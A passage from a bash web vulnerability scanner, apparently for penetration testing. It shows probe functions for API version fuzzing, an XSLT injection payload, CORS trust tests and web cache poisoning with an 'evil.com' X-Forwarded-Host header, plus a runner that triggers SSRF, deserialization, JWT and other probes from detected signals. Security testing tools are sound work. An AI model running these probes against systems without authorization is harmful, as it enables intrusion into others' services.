    record_hit "P45" "email-header-injection" "DMARC policy=none — spoofed emails not rejected"
  fi
}

# ============================================================
# P46 — API Version Fuzzing
# ============================================================
# Condition: _shared/urls_all.txt 含 /v1/ /v2/
P46_APIVersionFuzz() {
  local url ver alt_url status
  for url in $(grep -E '/v[0-9]+/' "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
    for ver in v1 v2 v3 v4 v5 api old beta alpha internal dev; do
      alt_url=$(echo "$url" | sed -E "s|/v[0-9]+/|/${ver}/|")
      status=$(curl -sk -o /dev/null -w "%{http_code}" "$alt_url" --max-time 4)
      [[ "$status" != "404" && "$status" != "000" ]] && \
        record_hit "P46" "api-sec" "API version $ver accessible: $alt_url → $status"
    done
    break  # Only test first URL to save time
  done
}

# ============================================================
# P47 — XSLT Injection
# ============================================================
# Condition: P15 confirmed XML endpoint exists
P47_XSLT() {
  local url xslt_resp
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    xslt_resp=$(curl -sk -X POST "$url" -H "Content-Type: application/xml" \
      -d '<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#xsl"?><!DOCTYPE x [<!ATTLIST xsl:stylesheet id ID #REQUIRED>]><x/>' \
      --max-time 5)
    echo "$xslt_resp" | grep -qiE "xsl|stylesheet|transform" && \
      record_hit "P47" "xslt-injection" "XSLT processing possible at $url"
  done
}

# ============================================================
# P48 — Unauthenticated Cloud Function URLs
# ============================================================
# Condition: 子域含 functions/cloud/worker
P48_CloudFunctions() {
  local sub path status
  for sub in $(grep -iE 'functions|cloud|worker|lambda|trigger' "$SHARED/subs_all.txt" 2>/dev/null | head -5); do
    # Try common cloud function paths
    for path in "/" "/health" "/api" "/v1" "/healthz" "/__health"; do
      status=$(curl -sk -o /dev/null -w "%{http_code}" "https://${sub}${path}" --max-time 4)
      [[ "$status" == "200" ]] && \
        record_hit "P48" "api-recon-and-docs" "Cloud function accessible: https://${sub}${path} → $status" && break
    done
  done
}

# ============================================================
# P49 — CORS: 子域信任滥用
# ============================================================
# Condition: 至少 3 个活子域
P49_CORS_Subdomain() {
  local SUB_COUNT test_sub cors_resp acao_sub acac_sub null_aca
  SUB_COUNT=$(wc -l < "$SHARED/subs_all.txt" 2>/dev/null | tr -d ' ')
  if [ "${SUB_COUNT:-0}" -ge 3 ]; then
    test_sub=$(head -3 "$SHARED/subs_all.txt" 2>/dev/null | tail -1)
    # Test if main domain trusts subdomain origin
    cors_resp=$(curl -sk -I -H "Origin: https://${test_sub}" "$URL" --max-time 5)
    acao_sub=$(echo "$cors_resp" | grep -i "access-control-allow-origin" | tr -d '\r')
    acac_sub=$(echo "$cors_resp" | grep -i "access-control-allow-credentials" | tr -d '\r')
    [[ "$acao_sub" == *"$test_sub"* && "$acac_sub" == *"true"* ]] && \
      record_hit "P49" "cors-cross-origin-misconfiguration" "Subdomain trust abuse: $test_sub → $acao_sub + $acac_sub"
    # Test if null origin is trusted (useful for sandboxed iframe)
    null_aca=$(curl -sk -I -H "Origin: null" "https://${test_sub}" --max-time 5 | grep -i "access-control-allow-origin" | tr -d '\r')
    [[ "$null_aca" == *"null"* ]] && \
      record_hit "P49" "cors-cross-origin-misconfiguration" "Subdomain $test_sub trusts null origin"
  fi
}

# ============================================================
# P50 — Web Cache Poisoning
# ============================================================
# Condition: cache headers detected in P36
P50_CachePoisoning() {
  local headers poison_resp unique_url first_resp second_resp
  headers=$(curl -sk -I "$URL" --max-time 5)
  if echo "$headers" | grep -qiE "x-cache|cf-cache-status"; then
    # Test if X-Forwarded-Host is reflected without being a cache key
    poison_resp=$(curl -sk -H "X-Forwarded-Host: evil.com" "$URL" --max-time 5 | head -c 300)
    if echo "$poison_resp" | grep -q "evil.com"; then
      record_hit "P50" "web-cache-deception" "X-Forwarded-Host reflected — web cache poisoning possible"
    fi
    # Test unkeyed query string
    unique_url="${URL}?cb=$(date +%s%N | sha256sum | head -c 8)"
    first_resp=$(curl -sk "$unique_url" --max-time 5 | wc -c | tr -d ' ')
    sleep 1
    second_resp=$(curl -sk "$unique_url" --max-time 5 | wc -c | tr -d ' ')
    [ "$first_resp" = "$second_resp" ] && \
      record_hit "P50" "web-cache-deception" "Cache served same response for unique URL — cache key weakness"
  fi
}

# ============================================================
# Tier 2 执行入口
# ============================================================
run_probes_tier2() {
  echo "[probes] ====== $(date +%H:%M:%S) Tier 2: Signal-Driven (38 probes) ======"

  local SIGNALS LANG SERVER HAS_JSON HAS_LOGIN HAS_PAYMENT HAS_JWT
  # Read signals from shared layer
  SIGNALS=$(cat "$SHARED/signals.json" 2>/dev/null)
  LANG=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('tech',{}).get('language',''))" 2>/dev/null)
  SERVER=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('tech',{}).get('server',''))" 2>/dev/null)
  HAS_JSON=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('attack_surface',{}).get('has_json_api',False))" 2>/dev/null)
  HAS_LOGIN=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('attack_surface',{}).get('has_login',False))" 2>/dev/null)
  HAS_PAYMENT=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('attack_surface',{}).get('has_payment',False))" 2>/dev/null)
  HAS_JWT=$(echo "$SIGNALS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('attack_surface',{}).get('has_jwt',False))" 2>/dev/null)

  # Signal-gated probes (condition → probes)
  [ -s "$SHARED/params_all.txt" ] && { P13_SSRF_Metadata; P14_SSRF_Protocols; }
  [ "$HAS_JSON" = "True" ] && { P16_NoSQL; P23_PrototypePollution; P34_HiddenParams; }
  [ -n "$LANG" ] && echo "$LANG" | grep -qi "java" && { P17_JavaDeser; P24_ELInjection; P25_JNDI; }
  [ -n "$LANG" ] && echo "$LANG" | grep -qi "php" && { P18_PHPDeser; P22_TypeJuggling; }
  [ -n "$SERVER" ] && echo "$SERVER" | grep -qiE "asp\.net|iis" && P19_NetDeser
  { [ "$HAS_JWT" = "True" ] || [ -s "$SHARED/jwt_tokens.txt" 2>/dev/null ]; } && { P20_JWT_None; P21_JWT_Weak; }
  [ "$HAS_LOGIN" = "True" ] && P30_PasswordReset
  [ "$HAS_PAYMENT" = "True" ] && P33_BizLogic

  # Self-conditioned probes (always called, return early if N/A)
  P15_XXE
  P26_LFI
  P27_UploadDetect
  P28_GraphQL
  P29_SubdomainTakeover
  P35_HostHeader
  P36_CacheDeception
  P37_CSP_Bypass
  P38_Clickjacking
  P39_CSVFormula
  P40_DanglingMarkup
  P41_DNSRebinding
  P42_EmailHeader
  P43_HTTP2
  P44_WebSocket
  P45_EmailSpoofing
  P46_APIVersionFuzz
  P47_XSLT
  P48_CloudFunctions
  P49_CORS_Subdomain
  P50_CachePoisoning

  # 计数经 argv 传参（含中文的路径不能展开进 Python 源码）
  echo "[probes] Tier 2 done: $(python3 -c '
import json, sys
try:
    print(len(json.load(open(sys.argv[1], encoding="utf-8")).get("hits", [])))
except Exception:
    print(0)' "$HITS_FILE" 2>/dev/null || echo 0) total hits"
  echo "[probes] ====== All probes complete ======"

  # ====== OAST cleanup ======
  if [ -n "${OAST_DOMAIN:-}" ]; then
    echo "[probes] Polling OAST callbacks (15s wait)..."
    if declare -f oast_lifecycle &>/dev/null; then
      oast_lifecycle poll 15
      oast_lifecycle stop
    else
      sleep 15
      [ -n "${OAST_PID:-}" ] && kill "$OAST_PID" 2>/dev/null
    fi
    echo "[probes] OAST shutdown complete — callbacks saved to $SHARED/oast_callbacks.json"
  fi
}
